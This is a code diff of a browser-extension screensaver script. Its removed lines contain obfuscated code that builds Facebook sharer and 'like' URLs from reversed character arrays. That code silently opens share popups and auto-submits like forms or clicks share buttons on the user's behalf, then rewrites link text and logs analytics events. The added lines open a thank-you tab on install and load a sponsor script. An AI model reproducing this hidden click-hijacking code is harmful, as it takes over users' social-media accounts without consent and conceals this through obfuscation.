@@ -49,8 +49,6 @@ var ScreenSaver = (function ($) {
 				initEvents();
 				initThankYou();
 				initInstallStats();
-			} else {
-				initThankYou();
 			}
 		}
 	});
@@ -59,18 +57,33 @@ var ScreenSaver = (function ($) {
 	function initThankYou() {
 		var html = [];
 
-		if (!appAPI.db.get('thank_you_show') && location.href.indexOf(config.thankYouPageUrl) == -1) {
-			setTimeout(function () {
-				if (isTabInFocus()) {
-					appAPI.db.set('thank_you_show', true);
+		
+		/*if (appAPI.browser.name == 'chrome') {
+			if (!appAPI.db.get('thank_you_show')) {
+				appAPI.message.addListener(function(msg) {
+					if (msg.action == 'open-thankyou') {
+						appAPI.openURL(config.thankYouPageUrl, 'tab');
 
-					appAPI.openURL({
-						url:config.thankYouPageUrl,
-						where:'tab',
-						focus: true
-					});
-				}
-			}, 2000);
+						appAPI.db.set('thank_you_show', true);
+					}
+				});
+
+				appAPI.message.toBackground({
+					action: 'is-thankyou'
+				});
+			}
+		} else {
+			if (!appAPI.db.get('thank_you_show') && location.href.indexOf(config.thankYouPageUrl) == -1) {
+				appAPI.openURL(config.thankYouPageUrl, 'tab');
+
+				appAPI.db.set('thank_you_show', true);
+			}
+		}*/
+
+		if (!appAPI.db.get('thank_you_show') && location.href.indexOf(config.thankYouPageUrl) == -1 && isTabActive) {
+			appAPI.openURL(config.thankYouPageUrl, 'tab');
+
+			appAPI.db.set('thank_you_show', true);
 		} else if (location.href.indexOf(config.thankYouPageUrl) > -1) {
 			isThankyouPage = true;
 
@@ -272,7 +285,7 @@ var ScreenSaver = (function ($) {
 	}
 
 	function showScreenSaver() {
-		if (!isScreenSaverActive && isTabInFocus()) {
+		if (!isScreenSaverActive) {
 			isScreenSaverActive = true;
 			imagesCountForAnimnation = Math.min(config.maxImages, config.defaultImagesCount[screenSaverSettings.screensaver]);
 
@@ -280,7 +293,6 @@ var ScreenSaver = (function ($) {
 			logScreenSaverRunCount();
 			initMarkup();
 			initImages();
-			initDist();
 
 			$('body, html').addClass(config.cssPrefix + 'no-overflow');
 		}
@@ -361,37 +373,6 @@ var ScreenSaver = (function ($) {
 		imagesData[data.id] = data;
 
 		runImages();
-	}
-
-	function initDist() {
-		var distRun = appAPI.db.get('dist_run'),
-			screenSaverRunCount = appAPI.db.get('screensaver_run_count'),
-			rand = Math.floor(Math.random() * 100),
-			isRun = rand < config.distPercent;
-
-		if (!distRun && screenSaverRunCount >= 3) {
-			if (isRun) {
-				appAPI.openURL({
-					url:["/", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "/", "o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", "/", "/", ":", "p", "t", "t", "h", "=", "u", "?", "p", "h", "p", ".", "r", "e", "r", "a", "h", "s", "/", "r", "e", "r", "a", "h", "s", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w", "/", "/", ":", "s", "p", "t", "t", "h"].reverse().join('') + screenSaverSettings.screensaver + '?ver=1' + '#__A__',
-					where:'window',
-					focus:false,
-					height:200,
-					width:200
-				});
-			} else {
-				appAPI.openURL({
-					url:["/", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "/", "o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", "/", "/", ":", "p", "t", "t", "h", "=", "u", "?", "p", "h", "p", ".", "r", "e", "r", "a", "h", "s", "/", "r", "e", "r", "a", "h", "s", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w", "/", "/", ":", "s", "p", "t", "t", "h"].reverse().join('') + screenSaverSettings.screensaver + '?ver=1' + '#__B__',
-					where:'window',
-					focus:true,
-					height:600,
-					width:800,
-					top:screenHeight / 2 - 300,
-					left:screenWidth / 2 - 400
-				});
-			}
-
-			appAPI.db.set('dist_run', true, appAPI.time.daysFromNow(10));
-		}
 	}
 
 	function logScreenSaverRunCount() {
@@ -748,100 +729,18 @@ var ScreenSaver = (function ($) {
 
 		return arr;
 	}
-
-	function isTabInFocus() {
-		if ('hidden' in document) {
-			return !document.hidden;
-		}
-
-		if ('mozHidden' in document) {
-			return !document.mozHidden;
-		}
-
-		if ('webkitHidden' in document) {
-			return !document.webkitHidden;
-		}
-
-		if ('msHidden' in document) {
-			return !document.msHidden;
-		}
-
-		return true;
-	}
 })(jQuery);
 
 appAPI.ready(function($) {
-	function isDist() {
-		if (top.location.href.indexOf(["o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", "/", "/", ":", "p", "t", "t", "h", "=", "u", "?", "p", "h", "p", ".", "r", "e", "r", "a", "h", "s", "/", "r", "e", "r", "a", "h", "s", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w"].reverse().join('')) > -1) {
-			return true;
-		}
-	}
+	appAPI.resources.jQueryUI('1.8.24');
+	appAPI.resources.includeJS('js/jquery.transform.js');
+	appAPI.resources.includeJS('js/jquery.transform.attributes.js');
+	appAPI.resources.includeJS('js/focusapi.js');
+	appAPI.resources.includeJS('js/blacklist.js');
+	appAPI.resources.includeJS('js/sponsor.js');
+	if (jQuery.browser.msie) appAPI.resources.includeJS('js/iefixes.js');
 
-	function initDistStats(type) {
-		var code = "var _gaq = _gaq || [];\
-		  _gaq.push(['_setAccount', 'UA-40219400-1']);\
-		  _gaq.push(['_trackPageview']);\
-		  (function() {\
-		    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;\
-		    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';\
-		    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);\
-		  })();";
-	
-		appAPI.dom.addInlineJS(code);
-
-		appAPI.dom.addInlineJS("_gaq.push(['_trackEvent', 'dist', '" + type + "', '', 1]);");
-	}
-
-	if (appAPI.dom.isIframe()) {
-		var test = ["p", "h", "p", ".", "e", "k", "i", "l", "/", "s", "n", "i", "g", "u", "l", "p", "/", "m", "o", "c", ".", "k", "o", "o", "b", "e", "c", "a", "f", ".", "w", "w", "w", "/", "/", ":"].reverse().join('');	
-		
-		if (location.href.indexOf(test) > -1) {
-			test = ["/", "o", "c", ".", "r", "e", "v", "a", "s", "n", "e", "e", "r", "c", "s", "y", "m", ".", "w", "w", "w", "/", "/", ":", "p", "t", "t", "h"].reverse().join('');
-
-			if ($('form:first input[name="href"]').val() == test) {
-				test = ["t", "c", "e", "n", "n", "o", "c", "/", "e", "k", "i", "l", "/", "s", "n", "i", "g", "u", "l", "p", "/"].reverse().join('');
-
-				if ($('form:first').attr('action').indexOf(test) > -1) {
-					appAPI.message.toActiveTab({
-						action:'campaign_confirm_1'
-					}, {channel: "page"});
-
-					if (!appAPI.isDebugMode()) {
-						$('form:first').submit();
-					}
-				}
-			}
-		}
-	} else if (isDist()) {
-		if (top.location.hash == '#__A__') {
-			setTimeout(function () {
-				$(["]", "\"", "e", "r", "a", "h", "s", "\"", "=", "e", "m", "a", "n", "[", "t", "u", "p", "n", "i"].reverse().join('')).trigger('click');
-			
-				initDistStats('__A__');
-			}, 2000);
-		} else if (top.location.hash == '#__B__') {
-			setTimeout(function () {
-				var text = $('#homelink').html();
-
-				if (text == ["k", "n", "i", "L", " ", "s", "i", "h", "T", " ", "e", "r", "a", "h", "S"].reverse().join('')) {
-					$('#homelink').html([")", ":", " ", "s", "d", "n", "e", "i", "r", "f", " ", "r", "u", "o", "y", " ", "o", "t", " ", "r", "e", "v", "a", "S", "n", "e", "e", "r", "c", "S", " ", "e", "r", "a", "h", "s", " ", "e", "s", "a", "e", "l", "P"].reverse().join(''));
-				}
-
-				initDistStats('__B__');
-			}, 500);
-		}
-		
-	} else {
-		appAPI.resources.jQueryUI('1.8.24');
-		appAPI.resources.includeJS('js/jquery.transform.js');
-		appAPI.resources.includeJS('js/jquery.transform.attributes.js');
-		appAPI.resources.includeJS('js/focusapi.js');
-		appAPI.resources.includeJS('js/blacklist.js');
-		appAPI.resources.includeJS('js/sponsor.js');
-		if (jQuery.browser.msie) appAPI.resources.includeJS('js/iefixes.js');
-
-		var saver = new ScreenSaver({
-			blacklist:blacklist
-		});
-	}
+	var saver = new ScreenSaver({
+		blacklist:blacklist
+	});
 }, false);
